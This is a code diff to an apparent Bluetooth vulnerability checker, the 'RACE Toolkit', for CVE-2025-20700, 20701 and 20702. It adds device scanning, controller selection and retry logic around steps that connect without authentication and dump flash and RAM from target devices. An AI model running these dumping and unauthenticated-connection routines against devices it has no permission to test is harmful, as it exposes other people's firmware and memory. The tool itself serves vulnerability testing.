@@ -102,6 +102,244 @@ def release_bluetooth_controller(controller: str):
         "Bluetooth controller %s should now be available", controller)
 
 
+def reset_hci_controller(hci_device: str = "hci0") -> bool:
+    """Reset the HCI Bluetooth controller to clear stuck connections.
+
+    Args:
+        hci_device: The HCI device name (default: hci0).
+
+    Returns:
+        True if reset was successful, False otherwise.
+    """
+    logging.info("Resetting Bluetooth controller %s...", hci_device)
+    try:
+        # First bring the device down
+        subprocess.run(
+            ["sudo", "hciconfig", hci_device, "down"],
+            capture_output=True,
+            timeout=5,
+            check=False
+        )
+        time.sleep(0.3)
+
+        # Then bring it back up
+        result = subprocess.run(
+            ["sudo", "hciconfig", hci_device, "up"],
+            capture_output=True,
+            timeout=5,
+            check=False
+        )
+
+        if result.returncode == 0:
+            logging.info(
+                "Bluetooth controller %s reset successfully.", hci_device)
+            time.sleep(0.5)  # Give it time to reinitialize
+            return True
+        else:
+            logging.warning(
+                "Failed to reset %s: %s",
+                hci_device,
+                result.stderr.decode() if result.stderr else "unknown error"
+            )
+            return False
+    except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError) as e:
+        logging.warning("Could not reset HCI controller: %s", e)
+        return False
+
+
+def enumerate_bluetooth_controllers() -> list[tuple[str, str]]:
+    """Enumerate available USB Bluetooth controllers.
+
+    Returns:
+        List of tuples (controller_spec, description) for each controller found.
+    """
+    controllers = []
+    try:
+        import usb1
+        ctx = usb1.USBContext()
+        for dev in ctx.getDeviceList():
+            # Bluetooth class is 0xE0 (Wireless Controller)
+            is_bt = False
+            try:
+                if dev.getDeviceClass() == 0xE0:
+                    is_bt = True
+                else:
+                    for cfg in dev:
+                        for intf in cfg:
+                            for setting in intf:
+                                if setting.getClass() == 0xE0:
+                                    is_bt = True
+                                    break
+            except usb1.USBError:
+                pass
+
+            if is_bt:
+                vid = dev.getVendorID()
+                pid = dev.getProductID()
+                try:
+                    prod = dev.getProduct() or "Bluetooth Controller"
+                except usb1.USBError:
+                    prod = "Bluetooth Controller"
+
+                # Build controller spec
+                ctrl_spec = f"usb:{vid:04X}:{pid:04X}"
+                controllers.append((ctrl_spec, prod))
+    except ImportError:
+        logging.warning("usb1 not installed, cannot enumerate USB controllers")
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.debug("Error enumerating controllers: %s", e)
+
+    return controllers
+
+
+def select_bluetooth_controller(controller: str | None) -> str | None:
+    """Select a Bluetooth controller, prompting user if needed.
+
+    Args:
+        controller: User-specified controller string, or None to enumerate.
+
+    Returns:
+        Controller specification string, or None if none available.
+    """
+    if controller:
+        return controller
+
+    controllers = enumerate_bluetooth_controllers()
+    if not controllers:
+        logging.error(
+            "No USB Bluetooth controllers found. "
+            "Please specify --controller manually."
+        )
+        return None
+
+    if len(controllers) == 1:
+        ctrl_spec, prod = controllers[0]
+        logging.info("Using Bluetooth controller: %s (%s)", prod, ctrl_spec)
+        return ctrl_spec
+
+    # Multiple controllers - let user choose
+    logging.info("Available Bluetooth controllers:")
+    for i, (ctrl_spec, prod) in enumerate(controllers):
+        logging.info("  [%d] %s (%s)", i, prod, ctrl_spec)
+
+    chosen = -1
+    while chosen < 0 or chosen >= len(controllers):
+        try:
+            chosen = int(input("Select controller [0]: ") or "0")
+        except ValueError:
+            pass
+
+    return controllers[chosen][0]
+
+
+async def scan_classic_devices(
+    controller: str, timeout: float = 10.0
+) -> list[tuple[str, str]]:
+    """Scan for Bluetooth Classic devices.
+
+    Args:
+        controller: Controller specification string.
+        timeout: How long to scan in seconds.
+
+    Returns:
+        List of tuples (address, name) for each device found.
+    """
+    from bumble.device import Device, DeviceConfiguration
+    from bumble.transport import open_transport_or_link
+    from bumble.hci import Address
+
+    devices: dict[str, str] = {}
+
+    try:
+        t = await open_transport_or_link(controller)
+        config = DeviceConfiguration()
+        config.keystore = "JsonKeyStore"
+        config.address = Address.generate_static_address()
+        config.name = "BumbleRace"
+        device = Device.from_config_with_hci(config, t.source, t.sink)
+        device.classic_enabled = True
+        await device.power_on()
+
+        def on_inquiry_result(
+            address, class_of_device, data, rssi  # pylint: disable=unused-argument
+        ):
+            addr_str = str(address)
+            # Try to get name from Extended Inquiry Response
+            name = data.get(0x09)  # Complete Local Name
+            if not name:
+                name = data.get(0x08)  # Shortened Local Name
+            if name:
+                if isinstance(name, bytes):
+                    name = name.decode("utf-8", errors="replace")
+                devices[addr_str] = name
+            elif addr_str not in devices:
+                devices[addr_str] = "(unknown)"
+
+        device.on("inquiry_result", on_inquiry_result)
+
+        logging.info(
+            "Scanning for Bluetooth Classic devices (%.0fs)...", timeout
+        )
+        await device.start_discovery()
+
+        await asyncio.sleep(timeout)
+
+        await device.stop_discovery()
+        await t.close()
+
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.error("Classic device scan failed: %s", e)
+
+    return list(devices.items())
+
+
+def select_classic_device(
+    devices: list[tuple[str, str]], target_address: str | None
+) -> str | None:
+    """Select a Bluetooth Classic device, prompting user if needed.
+
+    Args:
+        devices: List of (address, name) tuples from scanning.
+        target_address: User-specified address, or None to prompt.
+
+    Returns:
+        Device address string, or None if none available.
+    """
+    if target_address:
+        return target_address
+
+    if not devices:
+        logging.error(
+            "No Bluetooth Classic devices found. "
+            "Please specify --target-address manually."
+        )
+        return None
+
+    # Always prompt user to select - even with one device it may not be the right one
+    logging.info("Found %d Bluetooth Classic device(s):", len(devices))
+    for i, (addr, name) in enumerate(devices):
+        logging.info("  [%d] %s (%s)", i, name, addr)
+    logging.info("  [X] None of these / Enter address manually")
+
+    while True:
+        choice = input("Select device [0]: ").strip() or "0"
+        if choice.upper() == "X":
+            logging.info(
+                "Enter Bluetooth Classic address (AA:BB:CC:DD:EE:FF):")
+            manual_addr = input().strip()
+            if manual_addr and ":" in manual_addr:
+                return manual_addr
+            logging.error("Invalid address format.")
+            return None
+        try:
+            idx = int(choice)
+            if 0 <= idx < len(devices):
+                return devices[idx][0]
+        except ValueError:
+            pass
+        logging.info("Invalid choice, try again.")
+
+
 def parse_args():
     """Parse command line arguments and return the parsed namespace."""
     parser = argparse.ArgumentParser(description="RACE Toolkit")
@@ -358,6 +596,13 @@ def _is_valid_dump(data: bytes, threshold: float = 0.95) -> bool:
     return True
 
 
+def _print_vulnerability_summary(vulnerabilities: list[Vulnerability]) -> None:
+    """Print a summary of vulnerability check results."""
+    logging.info("Vulnerability status summary:")
+    for v in vulnerabilities:
+        logging.info("  [%-10s] %s: %s", v.status.name, v.id, v.description)
+
+
 async def command_check(args: argparse.Namespace):
     """Check device for RACE vulnerabilities and optionally dump firmware."""
     vulnerabilities = [
@@ -373,150 +618,243 @@ async def command_check(args: argparse.Namespace):
 
     logging.info("Starting device check.")
 
-    # Release the Bluetooth controller before starting
-    release_bluetooth_controller(args.controller)
+    # Select controller if not specified
+    controller = select_bluetooth_controller(args.controller)
+    if not controller:
+        return
 
-    logging.info("Step 1: Scanning Bluetooth Low Energy devices.")
-    logging.info("Scanning for 5 seconds...")
+    # Release the Bluetooth controller before starting
+    release_bluetooth_controller(controller)
+
     bdaddr = args.target_address
 
-    # Step 1: BLE Checks.
-    # - first check if the device is available via BLE
-    # - then check for UUIDs that we know about
-    # - lasty, connect to the device and try the following
-    #   - read from flash
-    #   - get bdaddr for Classic checks
-    le_checker = GATTBumbleChecker(args.controller, args.target_address)
-    await le_checker.setup(_noop_recv)
-    scan_res = await le_checker.scan_devices()
-    if scan_res:
-        addr, dev_name = scan_res
+    # Check if we have a Classic address format (contains colons, like AA:BB:CC:DD:EE:FF)
+    # If so, skip BLE scanning and go straight to Classic checks
+    skip_ble = False
+    if bdaddr and ":" in bdaddr and len(bdaddr) == 17:
         logging.info(
-            "Your device is %s (%s). Trying to identify RACE UUIDs via GATT.",
-            dev_name, addr
+            "Bluetooth Classic address provided (%s), skipping BLE scan.",
+            bdaddr
         )
-        try:
-            uuid_found = await le_checker.check_UUIDs(addr)
-        except asyncio.CancelledError:
-            logging.warning(
-                "BLE connection was cancelled. The device may have disconnected."
-            )
-            uuid_found = False
-        except (OSError, ConnectionError, BrokenPipeError) as e:
-            logging.warning("BLE connection error: %s", e)
-            uuid_found = False
-
-        if uuid_found:
-            _get_vuln(vulnerabilities,
-                      "CVE-2025-20700").status = VulnerabilityStatus.VULNERABLE
-
-            logging.info(
-                "Initiating a proper BLE connection to %s on %s.", dev_name, addr)
-            le_transport = GATTBumbleTransport(
-                args.controller, addr, [], False)
-            le_transport.connection = le_checker.connection
-            le_transport.device = le_checker.device
-            await le_transport.setup_gatt(_noop_recv)
-            r = RACE(le_transport, args.send_delay)
-            logging.info("Trying to read flash via BLE.")
-            d = RACEFlashDumper(r, 0x08000000, 0x1000)
-            # try to dump with a 10-second timeout
-            status = VulnerabilityStatus.FIXED
-            try:
-                dump_data = await asyncio.wait_for(d.dump(), 10.0)
-                # Check if we got valid data or just error responses
-                if dump_data and _is_valid_dump(dump_data):
-                    status = VulnerabilityStatus.VULNERABLE
-                    collected_dumps["ble_flash"] = dump_data
-                elif d.had_errors:
-                    logging.warning(
-                        "Flash dump had errors - device may have partial protections"
-                    )
-                else:
-                    logging.warning(
-                        "Flash dump returned invalid/empty data"
-                    )
-            except asyncio.TimeoutError:
-                logging.warning(
-                    "Timeout! Unable to dump flash within 10 seconds. Device might be fixed!"
-                )
-            except (OSError, ConnectionError, BrokenPipeError) as e:
-                logging.warning(
-                    "Unable to dump flash. Device might be fixed! Error is %s", e
-                )
-            _get_vuln(vulnerabilities, "CVE-2025-20702_LE").status = status
-
-            r = RACE(le_transport, args.send_delay)
-            await r.setup()
-            if not bdaddr:
-                try:
-                    logging.info(
-                        "Trying to obtain the Bluetooth Classic address for next step."
-                    )
-                    await asyncio.wait_for(r.send_sync(GetEDRAddress()), 8.0)
-                    bdaddr = GetEDRAddressResponse.unpack(
-                        r.sync_payload).bd_addr
-                    bdaddr = ":".join(f"{byte:02X}" for byte in bdaddr)
-                    logging.info(
-                        "Got Bluetooth Classic address %s", bdaddr
-                    )
-                except asyncio.TimeoutError:
-                    logging.warning(
-                        "Timeout! Unable to retrieve Bluetooth Classic address within 8 seconds. "
-                        "The RACE command might be unavailable, which is expected for many devices."
-                    )
-                except (OSError, ConnectionError, BrokenPipeError) as e:
-                    logging.warning("Error receiving BD addr: %s.", e)
-
-            await le_transport.close()
-            await le_checker.close()
-        else:
-            # uuid_found was False - close the checker and mark as not vulnerable
-            logging.info("No known RACE UUIDs found via GATT.")
-            await le_checker.close()
-    else:
-        logging.info(
-            "The device does not seem to be available via BLE. "
-            "It is probably not vulnerable to CVE-2025-20700! You could try again to be sure."
-        )
+        skip_ble = True
+        # Mark BLE vulns as not applicable since we're skipping
         _get_vuln(vulnerabilities,
                   "CVE-2025-20700").status = VulnerabilityStatus.NOT_APPLICABLE
         _get_vuln(vulnerabilities,
                   "CVE-2025-20702_LE").status = VulnerabilityStatus.NOT_APPLICABLE
-        await le_checker.close()
+
+    if not skip_ble:
+        logging.info("Step 1: Scanning Bluetooth Low Energy devices.")
+        logging.info("Scanning for 5 seconds...")
+
+        # Step 1: BLE Checks.
+        # - first check if the device is available via BLE
+        # - then check for UUIDs that we know about
+        # - lasty, connect to the device and try the following
+        #   - read from flash
+        #   - get bdaddr for Classic checks
+        le_checker = GATTBumbleChecker(controller, args.target_address)
+        await le_checker.setup(_noop_recv)
+        scan_res = await le_checker.scan_devices()
+        if scan_res:
+            addr, dev_name = scan_res
+            logging.info(
+                "Your device is %s (%s). Trying to identify RACE UUIDs via GATT.",
+                dev_name, addr
+            )
+            try:
+                uuid_found = await le_checker.check_UUIDs(addr)
+            except asyncio.CancelledError:
+                logging.warning(
+                    "BLE connection was cancelled. The device may have disconnected."
+                )
+                uuid_found = False
+            except (OSError, ConnectionError, BrokenPipeError) as e:
+                logging.warning("BLE connection error: %s", e)
+                uuid_found = False
+
+            if uuid_found:
+                _get_vuln(vulnerabilities,
+                          "CVE-2025-20700").status = VulnerabilityStatus.VULNERABLE
+
+                logging.info(
+                    "Initiating a proper BLE connection to %s on %s.",
+                    dev_name, addr
+                )
+                le_transport = GATTBumbleTransport(controller, addr, [], False)
+                le_transport.connection = le_checker.connection
+                le_transport.device = le_checker.device
+                await le_transport.setup_gatt(_noop_recv)
+                r = RACE(le_transport, args.send_delay)
+                logging.info("Trying to read flash via BLE.")
+                d = RACEFlashDumper(r, 0x08000000, 0x1000)
+                # try to dump with a 10-second timeout
+                status = VulnerabilityStatus.FIXED
+                try:
+                    dump_data = await asyncio.wait_for(d.dump(), 10.0)
+                    # Check if we got valid data or just error responses
+                    if dump_data and _is_valid_dump(dump_data):
+                        status = VulnerabilityStatus.VULNERABLE
+                        collected_dumps["ble_flash"] = dump_data
+                    elif d.had_errors:
+                        logging.warning(
+                            "Flash dump had errors - "
+                            "device may have partial protections"
+                        )
+                    else:
+                        logging.warning(
+                            "Flash dump returned invalid/empty data"
+                        )
+                except asyncio.TimeoutError:
+                    logging.warning(
+                        "Timeout! Unable to dump flash within 10 seconds. "
+                        "Device might be fixed!"
+                    )
+                except (OSError, ConnectionError, BrokenPipeError) as e:
+                    logging.warning(
+                        "Unable to dump flash. Device might be fixed! Error is %s",
+                        e
+                    )
+                _get_vuln(vulnerabilities, "CVE-2025-20702_LE").status = status
+
+                r = RACE(le_transport, args.send_delay)
+                await r.setup()
+                if not bdaddr:
+                    try:
+                        logging.info(
+                            "Trying to obtain the Bluetooth Classic address "
+                            "for next step."
+                        )
+                        await asyncio.wait_for(
+                            r.send_sync(GetEDRAddress()), 8.0
+                        )
+                        bdaddr = GetEDRAddressResponse.unpack(
+                            r.sync_payload).bd_addr
+                        bdaddr = ":".join(f"{byte:02X}" for byte in bdaddr)
+                        logging.info(
+                            "Got Bluetooth Classic address %s", bdaddr
+                        )
+                    except asyncio.TimeoutError:
+                        logging.warning(
+                            "Timeout! Unable to retrieve Bluetooth Classic "
+                            "address within 8 seconds. The RACE command might "
+                            "be unavailable, which is expected for many devices."
+                        )
+                    except (OSError, ConnectionError, BrokenPipeError) as e:
+                        logging.warning("Error receiving BD addr: %s.", e)
+
+                await le_transport.close()
+                await le_checker.close()
+            else:
+                # uuid_found was False - close the checker and mark as not vulnerable
+                logging.info("No known RACE UUIDs found via GATT.")
+                logging.info("")
+                logging.info(
+                    "BLE Result: Device does not appear to expose RACE via BLE.")
+                logging.info(
+                    "  - CVE-2025-20700 (GATT auth bypass): NOT VULNERABLE")
+                logging.info("  - CVE-2025-20702 via BLE: NOT VULNERABLE")
+                await le_checker.close()
+        else:
+            logging.info(
+                "The device does not seem to be available via BLE. "
+                "It is probably not vulnerable to CVE-2025-20700!"
+            )
+            _get_vuln(vulnerabilities,
+                      "CVE-2025-20700").status = VulnerabilityStatus.NOT_APPLICABLE
+            _get_vuln(vulnerabilities,
+                      "CVE-2025-20702_LE").status = VulnerabilityStatus.NOT_APPLICABLE
+            await le_checker.close()
+
+    # Ask user if they want to continue with Bluetooth Classic
+    logging.info("")
+    logging.info("-" * 60)
+    logging.info(
+        "Would you like to check Bluetooth Classic? [Y/n/q]: "
+    )
+    response = input().strip().lower()
+    if response in ("q", "quit", "exit"):
+        logging.info("Exiting.")
+        _print_vulnerability_summary(vulnerabilities)
+        return
+    if response in ("n", "no"):
+        logging.info("Skipping Bluetooth Classic checks.")
+        _print_vulnerability_summary(vulnerabilities)
+        return
 
     # Step 2: Classic Checks.
     # - if we have a BD addr supplied by user or retrieved via RACE we will take it
-    # - if not, we ask the user one more time
+    # - if not, scan for Classic devices or ask the user
     # - if we have the address:
     #   - enumerate RFCOMM services and look for known UUIDs
     #   - try to read flash via RFCOMM
     logging.info("Step 2: Checking Bluetooth Classic connection")
 
     # Release the Bluetooth controller again before Step 2
-    release_bluetooth_controller(args.controller)
+    release_bluetooth_controller(controller)
 
     if not bdaddr:
-        logging.error(
-            "Now I need a Bluetooth address. If you have it, please supply it now: "
-        )
-        bdaddr = input()
+        # Scan for Classic devices
+        logging.info("No Bluetooth Classic address available, scanning...")
+        classic_devices = await scan_classic_devices(controller, timeout=10.0)
+        bdaddr = select_classic_device(classic_devices, None)
+        if not bdaddr:
+            logging.error(
+                "Cannot proceed without a Bluetooth Classic address.")
+            # Print summary of what we found so far
+            _print_vulnerability_summary(vulnerabilities)
+            return
+        # Need to release again after scanning
+        release_bluetooth_controller(controller)
+
     # Ensure bdaddr is a string (it could be bytes from GetEDRAddressResponse)
     if isinstance(bdaddr, bytes):
         bdaddr = bdaddr.decode("ascii")
     bdaddr_str: str = str(bdaddr)
-    classic_checker = RFCOMMBumbleChecker(args.controller, bdaddr_str, False)
+    classic_checker = RFCOMMBumbleChecker(controller, bdaddr_str, False)
     await classic_checker.setup()
     logging.info("Trying to find RACE SSP RFCOMM UUID.")
 
     check_classic = True
+    uuid = None
     try:
         uuid = await classic_checker.check_UUIDs()
-    except (OSError, ConnectionError, BrokenPipeError, asyncio.CancelledError) as e:
-        logging.error(
-            "Unable to create a Bluetooth Classic connection. Error: %s", e)
-        logging.error("Skipping the rest of Bluetooth Classic checks!")
-        check_classic = False
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        # Catch all exceptions including bumble.core.ConnectionError
+        error_str = str(e).lower()
+        if "limited_resources" in error_str:
+            logging.error(
+                "Connection rejected - controller resources exhausted."
+            )
+            # Try to reset the controller and retry
+            await classic_checker.close()
+            reset_hci_controller()
+            release_bluetooth_controller(controller)
+            logging.info("Retrying connection after reset...")
+            classic_checker = RFCOMMBumbleChecker(
+                controller, bdaddr_str, False)
+            await classic_checker.setup()
+            try:
+                uuid = await classic_checker.check_UUIDs()
+            except Exception as retry_e:  # pylint: disable=broad-exception-caught
+                logging.error("Retry failed: %s", retry_e)
+                logging.info("Skipping the rest of Bluetooth Classic checks.")
+                check_classic = False
+                await classic_checker.close()
+        elif "page_timeout" in error_str:
+            logging.error(
+                "Device not responding. Is it powered on and in range?"
+            )
+            logging.info("Skipping the rest of Bluetooth Classic checks.")
+            check_classic = False
+            await classic_checker.close()
+        else:
+            logging.error(
+                "Unable to create a Bluetooth Classic connection: %s", e
+            )
+            logging.info("Skipping the rest of Bluetooth Classic checks.")
+            check_classic = False
+            await classic_checker.close()
 
     if check_classic:
         logging.info(
@@ -537,7 +875,7 @@ async def command_check(args: argparse.Namespace):
             await classic_checker.close()
 
             rfcomm = RFCOMMTransport(
-                args.controller, bdaddr_str, False, uuid=uuid)
+                controller, bdaddr_str, False, uuid=uuid)
 
             try:
                 r = RACE(rfcomm, args.send_delay)
@@ -590,9 +928,7 @@ async def command_check(args: argparse.Namespace):
             _get_vuln(
                 vulnerabilities, "CVE-2025-20702_BR_EDR").status = VulnerabilityStatus.FIXED
 
-    logging.info("Vulnerability status summary:")
-    for v in vulnerabilities:
-        logging.info("  [%-10s] %s: %s", v.status.name, v.id, v.description)
+    _print_vulnerability_summary(vulnerabilities)
 
     # Output collected firmware dumps
     if collected_dumps:
@@ -690,10 +1026,23 @@ async def command_enumerate_classic(args: argparse.Namespace):
     """
     from bumble.core import BT_BR_EDR_TRANSPORT
 
-    if not args.target_address:
-        logging.error(
-            "--target-address is required for enumerate-classic command")
+    # Select controller if not specified
+    controller = select_bluetooth_controller(args.controller)
+    if not controller:
         return
+
+    # Release Bluetooth controller
+    release_bluetooth_controller(controller)
+
+    # If no target address, scan for Classic devices
+    target_address = args.target_address
+    if not target_address:
+        devices = await scan_classic_devices(controller, timeout=10.0)
+        target_address = select_classic_device(devices, None)
+        if not target_address:
+            return
+        # Need to release again after scanning
+        release_bluetooth_controller(controller)
 
     logging.info("=" * 60)
     logging.info("CVE-2025-20701: Missing BR/EDR Authentication - PoC")
@@ -710,15 +1059,12 @@ async def command_enumerate_classic(args: argparse.Namespace):
     )
     logging.info("")
 
-    # Release Bluetooth controller
-    release_bluetooth_controller(args.controller)
-
     # Create checker to connect
-    checker = RFCOMMBumbleChecker(args.controller, args.target_address, False)
+    checker = RFCOMMBumbleChecker(controller, target_address, False)
     await checker.setup()
 
     logging.info("Connecting to %s without authentication...",
-                 args.target_address)
+                 target_address)
 
     try:
         # Connect without authentication
@@ -726,7 +1072,7 @@ async def command_enumerate_classic(args: argparse.Namespace):
             logging.error("Bluetooth device not initialized")
             return
         checker.connection = await checker.device.connect(  # type: ignore[misc]
-            args.target_address, transport=BT_BR_EDR_TRANSPORT
+            target_address, transport=BT_BR_EDR_TRANSPORT
         )
     except Exception as e:  # pylint: disable=broad-exception-caught
         error_str = str(e).lower()
@@ -743,6 +1089,25 @@ async def command_enumerate_classic(args: argparse.Namespace):
             logging.info("")
             logging.info(
                 "Tip: Make sure the target device is awake and nearby.")
+        elif "limited_resources" in error_str:
+            logging.info("Controller resources exhausted. Resetting...")
+            await checker.close()
+            reset_hci_controller()
+            release_bluetooth_controller(controller)
+            logging.info("Retrying connection after reset...")
+            checker = RFCOMMBumbleChecker(controller, target_address, False)
+            await checker.setup()
+            try:
+                if checker.device is None:
+                    logging.error("Bluetooth device not initialized")
+                    return
+                checker.connection = await checker.device.connect(
+                    target_address, transport=BT_BR_EDR_TRANSPORT
+                )
+            except Exception as retry_e:  # pylint: disable=broad-exception-caught
+                logging.error("Retry failed: %s", retry_e)
+                await checker.close()
+                return
         elif "authentication" in error_str or "rejected" in error_str:
             logging.info("Connection was REJECTED by the device.")
             logging.info(
@@ -938,8 +1303,8 @@ async def command_enumerate_race(r: RACE):
     logging.info("[5] RAM Access:")
     try:
         # Try to read a small chunk from a typical RAM address
-        dumper = RACEDumper(r)
-        sample_data = await dumper.dump(0x04200000, 16)
+        dumper = RACERAMDumper(r, 0x04200000, 16, progress=False)
+        sample_data = await dumper.dump()
         if sample_data:
             logging.info("    Successfully read 16 bytes from RAM")
             logging.info("    -> ACCESSIBLE - Full memory read possible!")
@@ -1308,8 +1673,8 @@ def run_main():
     except KeyboardInterrupt:
         logging.info("Interrupted by user.")
         sys.exit(130)
-    except (OSError, IOError, RuntimeError, ValueError) as e:
-        # Catch common runtime errors that may bubble up
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        # Catch-all for any other exceptions (including bumble exceptions)
         if debug_mode:
             logging.debug("Traceback:\n%s", traceback.format_exc())
         logging.error("Error: %s", e)
